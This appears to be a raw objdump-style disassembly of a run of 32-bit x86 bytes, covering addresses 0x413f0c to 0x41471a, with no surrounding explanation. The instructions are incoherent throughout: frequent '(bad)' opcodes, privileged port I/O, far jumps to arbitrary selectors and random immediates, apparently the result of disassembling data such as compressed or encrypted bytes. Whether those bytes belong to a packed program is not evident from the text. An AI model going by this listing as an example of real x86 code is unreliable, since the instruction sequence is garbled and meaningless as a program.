  413f0c:	mov    ch,0x20
  413f0e:	ja     0x413ee3
  413f10:	loop   0x413e9c
  413f12:	and    esi,ebx
  413f14:	sbb    DWORD PTR [edx+0x3c],0xc93fde2a
  413f1b:	push   ds
  413f1c:	repnz in al,0x4e
  413f1f:	fwait
  413f20:	outs   dx,DWORD PTR ds:[esi]
  413f21:	or     BYTE PTR [edx-0x1d],0xed
  413f25:	mov    esi,0x3202aff2
  413f2a:	cs repnz out dx,eax
  413f2d:	sbb    al,0x2
  413f2f:	xlat   BYTE PTR ds:[ebx]
  413f30:	aam    0x38
  413f32:	fwait
  413f33:	jb     0x413f0a
  413f35:	into   
  413f36:	ins    BYTE PTR es:[edi],dx
  413f37:	sub    al,0xe9
  413f39:	inc    ebp
  413f3a:	js     0x413eed
  413f3c:	mov    WORD PTR [ebp+0x2663b763],?
  413f42:	(bad)  
  413f43:	dec    ecx
  413f44:	push   0x8fd08175
  413f49:	mov    esp,0xac86de54
  413f4e:	lahf   
  413f4f:	xchg   ebp,eax
  413f50:	ret    0x2af
  413f53:	imul   esp,DWORD PTR [esi+esi*8+0x27],0x77
  413f58:	in     al,dx
  413f59:	pop    es
  413f5a:	pop    ds
  413f5b:	mov    WORD PTR [eax+0x72],gs
  413f5e:	sub    ch,bl
  413f60:	push   ds
  413f61:	and    al,0x33
  413f63:	jmp    0x5ded:0xfa56a862
  413f6a:	inc    esi
  413f6c:	pop    edi
  413f6d:	retf   
  413f6e:	fiadd  DWORD PTR [ebx]
  413f70:	fbstp  TBYTE PTR [edx]
  413f72:	pop    es
  413f73:	cmp    ch,bh
  413f75:	jns    0x413fef
  413f77:	push   cs
  413f78:	pop    edi
  413f79:	lods   eax,DWORD PTR ds:[esi]
  413f7a:	sub    ebx,DWORD PTR [ecx+0x5a5a9582]
  413f80:	aas    
  413f81:	fnsave [edx+0x7e]
  413f84:	aaa    
  413f85:	leave  
  413f86:	outs   dx,DWORD PTR ds:[esi]
  413f87:	stc    
  413f88:	in     eax,dx
  413f89:	add    eax,0xc74fcb89
  413f8e:	addr16 push esi
  413f90:	cmp    al,0xa7
  413f92:	out    0x39,al
  413f94:	in     al,0x1e
  413f96:	jnp    0x413ffa
  413f98:	mov    dh,0xa1
  413f9a:	xor    edi,DWORD PTR [edx-0xf]
  413f9d:	and    ecx,eax
  413f9f:	in     al,0x57
  413fa1:	push   ss
  413fa2:	push   ds
  413fa3:	mov    bh,BYTE PTR [ecx]
  413fa5:	call   0xf72b5ea9
  413faa:	nop
  413fab:	or     cl,BYTE PTR [esi]
  413fad:	in     al,0xc6
  413faf:	jge    0x413f7d
  413fb1:	int3   
  413fb2:	xchg   al,cl
  413fb4:	add    BYTE PTR [ecx],dh
  413fb6:	mov    edi,0xbf2c35b3
  413fbb:	add    BYTE PTR [esi+0x62],bh
  413fbe:	push   esi
  413fbf:	xor    eax,0xa23f8a2a
  413fc4:	mov    bh,BYTE PTR [ebp+0x7014e650]
  413fca:	lods   eax,DWORD PTR ds:[esi]
  413fcb:	adc    BYTE PTR [ebp-0x4f5aecb0],al
  413fd1:	dec    edx
  413fd2:	adc    eax,0xe6bf2bd6
  413fd7:	repnz and BYTE PTR ds:0x7d43dba8,bh
  413fde:	add    esi,edx
  413fe0:	and    DWORD PTR [ecx],ebx
  413fe2:	fnstenv [eax]
  413fe4:	je     0x414038
  413fe6:	jb     0x413fa4
  413fe8:	or     DWORD PTR [ecx],eax
  413fea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413feb:	sbb    BYTE PTR [eax+0x2f806353],al
  413ff1:	inc    esi
  413ff2:	xchg   edi,eax
  413ff3:	inc    esp
  413ff4:	dec    ebp
  413ff5:	fadd   QWORD PTR [eax+0x1292e5ba]
  413ffb:	(bad)  
  413ffc:	push   ds
  413ffd:	rol    DWORD PTR [ebx+ecx*1+0x7c],cl
  414001:	in     al,0x20
  414003:	sub    DWORD PTR [ebx+eiz*4+0x5049affe],ebp
  41400a:	dec    edi
  41400b:	hlt    
  41400c:	ret    
  41400d:	mov    ds:0x328a37ad,al
  414012:	scas   al,BYTE PTR es:[edi]
  414013:	hlt    
  414014:	pop    edi
  414015:	sbb    al,0x66
  414017:	(bad)  
  414018:	(bad)  
  41401a:	sbb    cl,BYTE PTR ds:0x523f1bd9
  414020:	cs jg  0x4140a0
  414023:	xchg   eax,ecx
  414025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414026:	mov    fs:0xae92c09b,eax
  41402c:	int3   
  41402d:	popa   
  41402e:	stc    
  41402f:	cmp    al,0x8a
  414031:	pop    edi
  414032:	mov    edx,0x9a63c7ac
  414037:	sbb    BYTE PTR ds:0xbf33f523,cl
  41403d:	lea    edi,[edx-0x569c8a2]
  414043:	sub    DWORD PTR [ebp-0x7e3894ec],ebp
  414049:	popf   
  41404a:	jo     0x41402e
  41404c:	test   DWORD PTR [esi],esi
  41404e:	sti    
  41404f:	add    bl,BYTE PTR [ecx-0x6b3f5100]
  414055:	push   0x6f8fba42
  41405a:	or     al,0x4e
  41405c:	inc    eax
  41405d:	in     eax,dx
  41405e:	out    0x8a,al
  414060:	repnz call 0xff64:0x2a5400ac
  414068:	mov    DWORD PTR [ecx],edx
  41406a:	mov    dh,0x72
  41406c:	pop    edi
  41406d:	add    bh,BYTE PTR [edi-0xd5f259c]
  414073:	pop    ebp
  414074:	ret    
  414075:	pop    esi
  414076:	xchg   edx,eax
  414077:	(bad)  
  414078:	mov    bl,0xde
  41407a:	add    BYTE PTR [eax-0x69],cl
  41407d:	and    BYTE PTR [esi+0x5a47edbb],dl
  414083:	push   edx
  414084:	data16 jno 0x41404c
  414087:	sub    eax,DWORD PTR cs:[edi+0x1b]
  41408b:	add    al,0xd9
  41408d:	xor    BYTE PTR [eax-0x19],dh
  414090:	lds    ebp,FWORD PTR [ebp+0x4b]
  414093:	jg     0x4140a7
  414095:	mov    BYTE PTR [ebx],cl
  414097:	loope  0x4140bf
  414099:	dec    edx
  41409a:	and    DWORD PTR [esi+0x1cc29c3c],ebx
  4140a0:	pop    ebp
  4140a1:	pop    esp
  4140a2:	push   ds
  4140a3:	and    BYTE PTR [ecx+0x7f848267],bh
  4140a9:	xchg   al,al
  4140ab:	fdivr  QWORD PTR [ebx+0x1b]
  4140ae:	call   0x32ca3dae
  4140b3:	in     eax,dx
  4140b4:	(bad)  
  4140b6:	and    edx,DWORD PTR [eax]
  4140b8:	adc    ecx,DWORD PTR [ecx]
  4140ba:	pop    esp
  4140bb:	mov    edx,0xcbb5cca5
  4140c0:	dec    edx
  4140c1:	aad    0x0
  4140c3:	fidivr DWORD PTR [ecx-0x6f]
  4140c6:	or     BYTE PTR [edi-0x7d],cl
  4140c9:	push   edx
  4140ca:	nop
  4140cb:	jnp    0x4140fb
  4140cd:	nop
  4140ce:	add    BYTE PTR fs:[edx+0x6be81031],0x6b
  4140d6:	and    DWORD PTR [edx-0x62],esp
  4140d9:	hlt    
  4140da:	mov    bh,0x74
  4140dc:	adc    esp,ebp
  4140de:	mov    esp,0x5254532b
  4140e3:	dec    eax
  4140e4:	jle    0x4140bd
  4140e6:	dec    edi
  4140e7:	das    
  4140e8:	xlat   BYTE PTR ds:[ebx]
  4140e9:	das    
  4140ea:	sbb    bh,BYTE PTR es:[ebx]
  4140ed:	lea    ecx,[eax+0x0]
  4140f0:	xor    ebx,edi
  4140f2:	lds    ecx,FWORD PTR [edx-0x7e]
  4140f5:	mov    bl,0x44
  4140f7:	scas   eax,DWORD PTR es:[edi]
  4140f8:	mov    cl,0xda
  4140fa:	std    
  4140fb:	call   0x25d1:0xbbf70242
  414102:	push   eax
  414103:	mov    edx,0xfc063f7
  414108:	cmp    edx,DWORD PTR [ebx+0x4a9732d7]
  41410e:	sbb    DWORD PTR [edx-0x22],0xffffffa4
  414112:	push   ebp
  414113:	arpl   WORD PTR [eax-0x464ed1cc],dx
  414119:	or     ah,BYTE PTR [edx]
  41411b:	and    bh,BYTE PTR [ebx-0x3f42553c]
  414121:	add    dh,al
  414123:	pop    ebp
  414124:	pop    edx
  414125:	pop    ebx
  414126:	mov    bl,0x19
  414128:	das    
  414129:	imul   esp,DWORD PTR [esi],0xffffffa8
  41412c:	jo     0x414124
  41412e:	inc    ebx
  41412f:	aas    
  414130:	or     ah,BYTE PTR [ecx+0x42]
  414133:	sub    ecx,DWORD PTR [edx-0x5383c051]
  414139:	push   ss
  41413a:	jmp    0x6deb97eb
  41413f:	pop    edi
  414140:	aaa    
  414141:	ja     0x4140c7
  414143:	div    DWORD PTR [ebx-0x19c0f60]
  414149:	push   esp
  41414a:	dec    esi
  41414b:	pop    ecx
  41414c:	push   ecx
  41414d:	mov    ecx,DWORD PTR [ebp+0x3694c13d]
  414153:	ss fwait
  414155:	add    eax,0x6179d3e8
  41415a:	sbb    DWORD PTR [edx+0x112c6770],eax
  414160:	lahf   
  414161:	xchg   esi,eax
  414162:	and    BYTE PTR [edx+ebx*8],0xfe
  414166:	mov    dl,BYTE PTR [eax+0x654fb3cf]
  41416c:	mov    esi,DWORD PTR [esi-0x47]
  41416f:	pop    eax
  414170:	popf   
  414171:	pop    ss
  414172:	push   edi
  414173:	pop    ebx
  414174:	xchg   ebp,eax
  414175:	loopne 0x4141e9
  414177:	xchg   ebp,eax
  414178:	xor    al,BYTE PTR [ebx]
  41417a:	push   ss
  41417b:	(bad)  
  41417d:	es lock push ebx
  414180:	adc    esp,DWORD PTR [ecx]
  414182:	fwait
  414183:	lods   al,BYTE PTR ds:[esi]
  414184:	mov    WORD PTR [ebx-0x38ab9d66],es
  41418a:	fstp   QWORD PTR [ebx]
  41418c:	sub    BYTE PTR [esi+0x298fd6af],dh
  414192:	sahf   
  414193:	sbb    eax,0x4b7d371d
  414198:	lods   eax,DWORD PTR ds:[esi]
  414199:	lock mov esp,DWORD PTR [bx+si]
  41419d:	aad    0x93
  41419f:	jmp    0xe80f:0x1597adf
  4141a6:	aam    0x1f
  4141a8:	pop    edi
  4141a9:	dec    ecx
  4141aa:	jg     0x414217
  4141ac:	or     al,0xa4
  4141ae:	fadd   st(7),st
  4141b0:	push   edi
  4141b1:	mov    edx,0x7c3484d3
  4141b6:	sbb    BYTE PTR [eax],dh
  4141b8:	hlt    
  4141b9:	mov    ah,0x37
  4141bb:	test   eax,0x3a82b15b
  4141c0:	sub    al,0x82
  4141c2:	mov    DWORD PTR [edi-0x30b77bb8],esp
  4141c8:	pusha  
  4141c9:	inc    edx
  4141ca:	mov    bl,BYTE PTR [ecx+0x4]
  4141cd:	stc    
  4141ce:	test   BYTE PTR [eax],0xda
  4141d1:	retf   0x787e
  4141d4:	xor    al,0xf0
  4141d6:	add    ebx,DWORD PTR [eax-0x6b]
  4141d9:	sbb    DWORD PTR [edi+esi*1+0x5342a233],edi
  4141e0:	adc    dh,bh
  4141e2:	lahf   
  4141e3:	inc    esp
  4141e4:	or     esi,DWORD PTR [esi]
  4141e6:	xchg   esp,eax
  4141e7:	cmp    BYTE PTR [esi],0xc0
  4141ea:	dec    ecx
  4141eb:	jo     0x414207
  4141ed:	and    al,0x7
  4141ef:	jo     0x414251
  4141f1:	or     DWORD PTR [ebx+0x5f],esi
  4141f4:	(bad)  
  4141f7:	or     DWORD PTR [edx],ebx
  4141f9:	mov    bh,0x41
  4141fb:	xor    eax,0x7e566f5b
  414200:	and    ecx,DWORD PTR [edx]
  414202:	mov    WORD PTR [eax],ss
  414204:	and    BYTE PTR [edx],dl
  414206:	mov    ds:0x39df5b61,al
  41420b:	ds xor al,0x7d
  41420e:	mov    edx,0xa3e32f60
  414213:	jmp    0xe5b:0x3021b1d1
  41421a:	xor    BYTE PTR [esi+0x5e3e6b0f],cl
  414220:	(bad)  
  414221:	sbb    dl,BYTE PTR [esp+eax*1]
  414224:	inc    esp
  414225:	adc    dh,BYTE PTR [ebp+0x3a]
  414228:	mov    bh,0x5a
  41422a:	das    
  41422b:	int    0x3
  41422d:	dec    esi
  41422e:	fstp   TBYTE PTR [ecx-0x359786ec]
  414234:	mov    esi,0x55ef2e26
  414239:	pop    esi
  41423a:	ja     0x414240
  41423c:	repnz cli 
  41423e:	sub    BYTE PTR [ecx],dh
  414240:	sti    
  414241:	fcmove st,st(1)
  414243:	daa    
  414244:	(bad)
  414247:	sub    eax,0x96055ad8
  41424c:	dec    eax
  41424d:	stos   BYTE PTR es:[edi],al
  41424e:	lods   eax,DWORD PTR ds:[esi]
  41424f:	jno    0x4141de
  414251:	ja     0x414252
  414253:	cmc    
  414254:	inc    ebx
  414255:	test   dh,al
  414257:	sbb    bh,BYTE PTR [edx-0x7167e777]
  41425d:	jo     0x4142cc
  41425f:	jl     0x414269
  414261:	push   ebx
  414262:	popf   
  414263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414264:	push   ss
  414265:	adc    dh,BYTE PTR [edi+0x59bcc925]
  41426b:	or     DWORD PTR [ebp-0x11501725],ebp
  414271:	hlt    
  414272:	lea    edi,[ebx+0x57]
  414275:	sbb    eax,DWORD PTR [ebx+0x549fac9e]
  41427b:	fidivr WORD PTR [edi-0x4c21d3a2]
  414281:	jbe    0x4142c5
  414283:	in     al,dx
  414284:	mov    WORD PTR [ebp+0x6e826ae7],ds
  41428a:	cmp    esi,DWORD PTR gs:[ebx+0x408e83fa]
  414291:	and    BYTE PTR [eax],ah
  414293:	or     bh,BYTE PTR [edi+0x53765075]
  414299:	inc    eax
  41429a:	mov    bl,0x77
  41429c:	sub    BYTE PTR [eax],dl
  41429e:	and    ah,ah
  4142a0:	arpl   WORD PTR [esi-0x24],cx
  4142a3:	out    dx,eax
  4142a4:	stos   DWORD PTR es:[edi],eax
  4142a5:	inc    esp
  4142a6:	(bad)
  4142a9:	rol    BYTE PTR [ebx-0x7b],0x43
  4142ad:	jbe    0x414278
  4142af:	outs   dx,DWORD PTR ds:[esi]
  4142b0:	cld    
  4142b1:	leave  
  4142b2:	fild   DWORD PTR [ecx+0x33]
  4142b5:	jge    0x41429a
  4142b7:	add    BYTE PTR [eax],dh
  4142b9:	jbe    0x4142d0
  4142bb:	xchg   esi,eax
  4142bc:	inc    ecx
  4142bd:	push   eax
  4142be:	sbb    eax,0x1ea54047
  4142c3:	mov    ds:0x3b5a3cec,al
  4142c8:	push   ebp
  4142c9:	push   0x27a5fd69
  4142ce:	cmp    ah,BYTE PTR [ecx+0x78c8a74b]
  4142d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142d5:	sbb    eax,0x9d7020b6
  4142da:	pop    ebp
  4142db:	or     DWORD PTR [edx+0x46],0x30a1a567
  4142e2:	xchg   esi,eax
  4142e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142e4:	mov    ecx,0xb384850a
  4142e9:	add    ah,BYTE PTR [ebx-0x66e2475a]
  4142ef:	add    dl,dl
  4142f1:	loop   0x414362
  4142f3:	adc    eax,0x183312ec
  4142f8:	(bad)  ss:[ebx-0x1801bc92]
  4142ff:	cld    
  414300:	cs scas al,BYTE PTR es:[edi]
  414302:	mov    bh,0xb2
  414304:	pop    esi
  414305:	pop    ds
  414306:	int    0x6d
  414308:	add    bh,BYTE PTR [edi+0x7cea20db]
  41430e:	lods   eax,DWORD PTR ds:[esi]
  41430f:	loope  0x41434f
  414311:	fistp  WORD PTR [edx+0x33]
  414314:	call   0x602d:0x8eefce9b
  41431b:	lods   al,BYTE PTR ds:[esi]
  41431c:	pop    esi
  41431d:	jne    0x4142c9
  41431f:	aam    0xe6
  414321:	ds xchg esi,eax
  414323:	popa   
  414324:	xor    eax,0x9f101b47
  414329:	jno    0x414337
  41432b:	xchg   ebp,eax
  41432c:	stc    
  41432d:	loope  0x4142c0
  41432f:	(bad)  
  414330:	xor    ebx,DWORD PTR [ecx+0x2048a760]
  414336:	(bad)  
  414337:	cmp    al,0xa6
  414339:	popa   
  41433a:	call   0xb7c3:0x168ce6f4
  414341:	xor    bh,BYTE PTR [ebx+0x27cf0d85]
  414347:	loop   0x4142dc
  414349:	cli    
  41434a:	(bad)  
  41434b:	fild   DWORD PTR [edi-0x53052406]
  414351:	std    
  414352:	lea    ecx,[ebp+0x58aa9400]
  414358:	xor    bh,ah
  41435a:	add    eax,0xbed24b93
  41435f:	out    0x9,eax
  414361:	dec    esi
  414362:	lock jne 0x4142f6
  414365:	gs mov dl,0x46
  414368:	fist   WORD PTR [esi+edx*1]
  41436b:	dec    edi
  41436c:	repz xchg esi,eax
  41436e:	add    BYTE PTR [ebx+0x756b4efb],al
  414374:	rcr    BYTE PTR [esi+0x5b98958e],1
  41437a:	pop    ebp
  41437b:	lea    ebx,[esi-0x28]
  41437e:	inc    esi
  41437f:	or     eax,0x6662a520
  414384:	sbb    al,0xa9
  414386:	add    ebx,DWORD PTR [esi]
  414388:	xchg   DWORD PTR [ecx],esp
  41438a:	cmp    al,0xec
  41438c:	ror    DWORD PTR [eax+0x38e3a490],1
  414392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414393:	fild   QWORD PTR [edx]
  414395:	mov    BYTE PTR [ecx-0x798039a9],dh
  41439b:	mov    esi,0xde56b91e
  4143a0:	mov    esi,0xe3e3e620
  4143a5:	scas   eax,DWORD PTR es:[edi]
  4143a6:	and    al,0x4a
  4143a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143a9:	dec    eax
  4143aa:	mov    edx,0x1b9a86e7
  4143af:	loop   0x4143c4
  4143b1:	stos   BYTE PTR es:[edi],al
  4143b2:	mov    fs,WORD PTR [edi+0x151b948c]
  4143b8:	in     al,dx
  4143b9:	jle    0x41435b
  4143bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143bc:	mov    bh,0xc
  4143be:	push   ecx
  4143bf:	jmp    0x4143aa
  4143c1:	push   ecx
  4143c2:	mov    ebx,0x2940dcdb
  4143c7:	cmp    esp,DWORD PTR [eax-0x63a99277]
  4143cd:	push   es
  4143ce:	iret   
  4143cf:	int3   
  4143d0:	sbb    bh,dl
  4143d2:	push   cs
  4143d3:	mov    cl,0x5c
  4143d5:	in     al,dx
  4143d6:	mov    esp,0xe364381e
  4143db:	dec    edi
  4143dc:	and    eax,0x29a84da2
  4143e1:	adc    DWORD PTR [ebx-0x7c],0x29
  4143e5:	push   ecx
  4143e6:	add    esp,DWORD PTR [ecx+0x24a2790e]
  4143ec:	popa   
  4143ed:	jl     0x41441b
  4143ef:	jb     0x414417
  4143f1:	ins    DWORD PTR es:[edi],dx
  4143f2:	call   0xed00:0xab420801
  4143f9:	cmp    eax,0xb5dc070a
  4143fe:	push   esi
  4143ff:	and    esp,DWORD PTR [ebp+0x66]
  414402:	add    DWORD PTR [ecx+0x380c86dd],0xffffffc7
  414409:	xor    ah,al
  41440b:	inc    ebp
  41440c:	in     eax,0x81
  41440e:	pop    esi
  41440f:	popa   
  414410:	sbb    al,BYTE PTR [edi-0x77a8fe26]
  414416:	dec    esp
  414417:	je     0x414459
  414419:	cwde   
  41441a:	and    eax,0x2635418e
  41441f:	call   0xd050:0x50919a66
  414426:	(bad)  [eax]
  414428:	shr    BYTE PTR [edx-0x22],1
  41442b:	mov    eax,0xc48a7a0a
  414430:	dec    ebx
  414431:	fwait
  414432:	stos   BYTE PTR es:[edi],al
  414433:	in     al,0xfa
  414435:	bswap  esi
  414437:	xor    edi,edi
  414439:	push   edi
  41443a:	adc    al,0x38
  41443c:	stc    
  41443d:	jae    0x414407
  41443f:	sbb    eax,0xfcf11b33
  414444:	mov    cl,0xb2
  414446:	mov    ecx,0x9bf29540
  41444b:	arpl   WORD PTR [edx+0x2a8e955a],di
  414451:	jg     0x414432
  414453:	fcom   st(1)
  414455:	lods   eax,DWORD PTR ds:[esi]
  414456:	or     cl,BYTE PTR [ebx-0x10d8fe95]
  41445c:	out    dx,al
  41445d:	outs   dx,DWORD PTR ds:[esi]
  41445e:	aas    
  41445f:	adc    eax,0x62156bb7
  414464:	adc    al,BYTE PTR [esi+0x124cf0b1]
  41446a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41446b:	adc    cl,ah
  41446d:	or     cl,BYTE PTR [eax+0x4a]
  414470:	sub    al,0xc
  414472:	mov    ds:0x384262a1,al
  414477:	outs   dx,BYTE PTR ds:[esi]
  414478:	out    0x98,eax
  41447a:	push   ebx
  41447b:	rol    BYTE PTR [esi],1
  41447d:	jae    0x41440a
  41447f:	shl    edx,0x96
  414482:	lahf   
  414483:	js     0x414446
  414485:	sbb    eax,0x298fedee
  41448a:	(bad)  
  41448b:	in     al,0x1
  41448d:	loope  0x414461
  41448f:	push   ss
  414490:	cmp    eax,0x72014f9d
  414495:	cmp    ebp,0x2e2ecb6b
  41449b:	leave  
  41449c:	(bad)  
  41449e:	adc    DWORD PTR [edi+0x16bebd7c],ecx
  4144a4:	dec    edi
  4144a5:	(bad)  
  4144a6:	cmc    
  4144a7:	dec    esi
  4144a8:	nop
  4144a9:	mov    ecx,0x31a2264b
  4144ae:	mov    esp,DWORD PTR [edx+0x5ce8c17d]
  4144b4:	jg     0x414504
  4144b6:	cmp    BYTE PTR [ebx],ch
  4144b8:	test   eax,0xebd6af80
  4144bd:	mov    edi,DWORD PTR [edi+0x42947eec]
  4144c3:	test   ebx,edx
  4144c5:	mov    ch,0xac
  4144c7:	xchg   ecx,eax
  4144c8:	icebp  
  4144c9:	inc    eax
  4144ca:	xor    eax,DWORD PTR [edx+ecx*1]
  4144cd:	jns    0x41449a
  4144cf:	mov    bh,BYTE PTR [edi-0x277f553b]
  4144d5:	cli    
  4144d6:	push   cs
  4144d7:	cmp    eax,0x93c99107
  4144dc:	push   ebx
  4144dd:	xor    ch,BYTE PTR [eax+0x26]
  4144e0:	dec    ecx
  4144e1:	mov    DWORD PTR [ecx+0x37],0x1acd76e6
  4144e8:	inc    esp
  4144e9:	call   0xe0a054d0
  4144ee:	or     edi,edx
  4144f0:	std    
  4144f1:	pop    ebp
  4144f2:	rol    DWORD PTR [eax-0x60eeabd5],0x2a
  4144f9:	popa   
  4144fa:	or     al,0x34
  4144fc:	dec    edx
  4144fd:	test   eax,0x19c7a248
  414502:	xchg   BYTE PTR [edi-0x1da08c21],ch
  414508:	dec    edi
  414509:	add    cl,ch
  41450b:	mov    eax,0xf1022712
  414510:	xor    edx,eax
  414512:	and    eax,esp
  414514:	mov    DWORD PTR [edx-0x37],ecx
  414517:	xchg   esp,eax
  414518:	in     al,0x28
  41451a:	call   0x6f1a9d0
  41451f:	xlat   BYTE PTR ds:[ebx]
  414520:	jb     0x414592
  414522:	cmp    BYTE PTR [eax],bl
  414524:	mov    al,ds:0x7c3eb688
  414529:	lds    edi,FWORD PTR ds:0xdcc517f3
  41452f:	jle    0x4145b0
  414531:	lods   al,BYTE PTR ds:[esi]
  414532:	dec    ebp
  414533:	fmul   st(4),st
  414535:	push   esi
  414536:	jl     0x414598
  414538:	xchg   ebp,eax
  414539:	ficom  DWORD PTR [eax+ecx*1-0x41c7c00e]
  414540:	push   esp
  414541:	dec    ecx
  414542:	push   ebx
  414543:	int    0xb6
  414545:	sbb    eax,0x1c4e436c
  41454a:	sti    
  41454b:	or     BYTE PTR [esi-0x5e],ah
  41454e:	js     0x414533
  414550:	iret   
  414551:	push   ebx
  414552:	repz or BYTE PTR [ebp+esi*4-0x2c],0xbd
  414558:	sub    ebx,ecx
  41455a:	xchg   BYTE PTR [esi+0x10],ah
  41455d:	pop    ss
  41455e:	sub    BYTE PTR [esi+0x4e],0x1a
  414562:	sub    BYTE PTR [ebp+0x77],dl
  414565:	adc    al,0xf5
  414567:	xor    DWORD PTR [esi-0x473035b8],ebp
  41456d:	aad    0x6
  41456f:	jmp    0x41454e
  414571:	sub    dh,BYTE PTR [esi-0x42]
  414574:	mov    fs,WORD PTR [edx+eax*2]
  414577:	test   DWORD PTR [ecx],0xa6d3f9bc
  41457d:	sub    esi,DWORD PTR [ebp-0x67]
  414580:	cmp    al,0x5c
  414582:	push   ecx
  414583:	dec    edi
  414584:	inc    ebp
  414585:	mov    DWORD PTR [edi-0x2b2dc259],esp
  41458b:	addr16 jp 0x4145ba
  41458e:	js     0x4145eb
  414590:	iret   
  414591:	mov    cs:0x4efee9a2,al
  414597:	les    eax,FWORD PTR [edx]
  414599:	pop    edi
  41459a:	mov    ds:0x5a2ea982,eax
  41459f:	jo     0x414545
  4145a1:	add    bh,BYTE PTR [edx-0x4f]
  4145a4:	sub    al,0x94
  4145a6:	sbb    BYTE PTR [ebx-0x65b9fa1a],0xbf
  4145ad:	clc    
  4145ae:	repnz fdiv QWORD PTR [edx-0x2ba76f95]
  4145b5:	pop    edi
  4145b6:	popf   
  4145b7:	pop    ds
  4145b8:	dec    eax
  4145b9:	xor    eax,0x9444f505
  4145be:	or     BYTE PTR [edi-0x41972cce],0x5d
  4145c5:	push   0xffffff81
  4145c7:	or     esp,ebp
  4145c9:	xchg   ecx,eax
  4145ca:	jl     0x4145c0
  4145cc:	sub    edi,ebx
  4145ce:	push   eax
  4145cf:	ins    DWORD PTR es:[edi],dx
  4145d0:	out    0xc3,al
  4145d2:	(bad)  
  4145d3:	and    al,0xb4
  4145d5:	dec    eax
  4145d6:	adc    DWORD PTR [ebx-0x6f],esp
  4145d9:	pushf  
  4145da:	(bad)  
  4145db:	cmp    bl,al
  4145dd:	popf   
  4145de:	ds push 0xc
  4145e1:	div    ebx
  4145e3:	out    0x83,eax
  4145e5:	dec    esp
  4145e6:	mov    ah,0xde
  4145e8:	es sbb DWORD PTR fs:[ebp+0x2645e23b],ebx
  4145f0:	imul   esp,eax,0x64541e31
  4145f6:	fdivr  DWORD PTR [ecx-0x48]
  4145f9:	das    
  4145fa:	jno    0x414646
  4145fc:	cmp    al,0x48
  4145fe:	dec    ebp
  4145ff:	xor    cl,bl
  414601:	arpl   WORD PTR [edi+0x6c],di
  414604:	cmp    eax,0x943c8730
  414609:	aas    
  41460a:	not    DWORD PTR [esp+ebp*2+0x75]
  41460e:	jbe    0x4145c6
  414610:	int3   
  414611:	fxrstor [edx-0x1b697e0e]
  414618:	jne    0x4145e0
  41461a:	xor    eax,0xa724c920
  41461f:	lock xor DWORD PTR [eax-0x74],0x373ffa45
  414627:	neg    DWORD PTR [edi-0x65ed02]
  41462d:	fistp  QWORD PTR [eax-0x71977938]
  414633:	dec    edi
  414634:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  414636:	push   ecx
  414637:	(bad)  
  414639:	mov    eax,0xef7cfe6e
  41463e:	lea    ebp,[ebx+0x1db354a4]
  414644:	aam    0x19
  414646:	xchg   DWORD PTR [ebp-0x7f],esi
  414649:	outs   dx,BYTE PTR ds:[esi]
  41464a:	jp     0x4146a3
  41464c:	xor    dh,0x9f
  41464f:	pop    edi
  414650:	stos   DWORD PTR es:[edi],eax
  414651:	fwait
  414652:	push   esp
  414653:	ins    BYTE PTR es:[edi],dx
  414654:	repnz pushf 
  414656:	mov    dh,0xb6
  414658:	cdq    
  414659:	fwait
  41465a:	or     bx,cx
  41465d:	test   DWORD PTR [edi+0x49],ebp
  414660:	call   0x988c3c82
  414665:	in     eax,dx
  414666:	lock pop edx
  414668:	xor    eax,0xd8802422
  41466d:	in     al,dx
  41466e:	inc    esp
  41466f:	mov    cl,0xd6
  414671:	sub    ebx,esp
  414673:	sbb    DWORD PTR [edi+0x58],edi
  414676:	leave  
  414677:	mov    dl,0x5f
  414679:	shl    DWORD PTR [ecx],1
  41467b:	loop   0x414625
  41467d:	xchg   BYTE PTR [edi-0x8d8da09],bl
  414683:	ret    0xccc0
  414686:	cmp    eax,0xb6389ca1
  41468b:	neg    DWORD PTR [eax]
  41468d:	add    edi,esp
  41468f:	inc    ecx
  414690:	ror    ebp,0xac
  414693:	loop   0x41461c
  414695:	mov    cl,0xb5
  414697:	xor    BYTE PTR [edi+0x31],ah
  41469a:	pop    esp
  41469b:	jp     0x414692
  41469d:	lods   al,BYTE PTR ds:[esi]
  41469e:	pop    edx
  41469f:	lock out dx,al
  4146a1:	in     eax,0xb3
  4146a3:	mov    ebx,0xe38efc3d
  4146a8:	sub    eax,0x389c4100
  4146ad:	adc    ah,al
  4146af:	xor    eax,0x46caed73
  4146b4:	out    dx,al
  4146b5:	fadd   DWORD PTR ds:0x45a4c818
  4146bb:	(bad)  
  4146bc:	dec    ebx
  4146bd:	in     eax,dx
  4146be:	push   0x82a86cd5
  4146c3:	xor    ecx,esp
  4146c5:	mov    al,ds:0x2e2d027e
  4146ca:	mov    edx,0xd155de0c
  4146cf:	and    eax,0x32a2731
  4146d4:	sbb    eax,0x9e46d7d
  4146d9:	add    esi,DWORD PTR [edx*4-0x58c18ece]
  4146e0:	inc    edx
  4146e2:	mov    fs,WORD PTR [eax+0x3b]
  4146e5:	into   
  4146e6:	pop    ebx
  4146e7:	sub    BYTE PTR [esi-0x2f],dh
  4146ea:	xchg   ebx,eax
  4146eb:	pop    ecx
  4146ec:	inc    ecx
  4146ed:	lods   al,BYTE PTR ds:[esi]
  4146ee:	cmp    dl,BYTE PTR ds:0xffafcebc
  4146f4:	dec    eax
  4146f5:	out    dx,eax
  4146f6:	jg     0x414771
  4146f8:	fistp  QWORD PTR [esi-0x2c08d791]
  4146fe:	xor    dl,bh
  414700:	or     BYTE PTR [esi],cl
  414702:	pop    esi
  414703:	cwde   
  414704:	jl     0x4146a6
  414706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414707:	ficom  WORD PTR [ebx+0x37]
  41470a:	pushf  
  41470b:	jb     0x4146ce
  41470d:	inc    esp
  41470e:	fild   WORD PTR [eax]
  414710:	mov    ecx,0xf180c63e
  414715:	hlt    
  414716:	adc    al,0xb2
  414718:	cli    
  414719:	(bad)  
  41471a:	fisubr DWORD PTR [eax-0x2e]
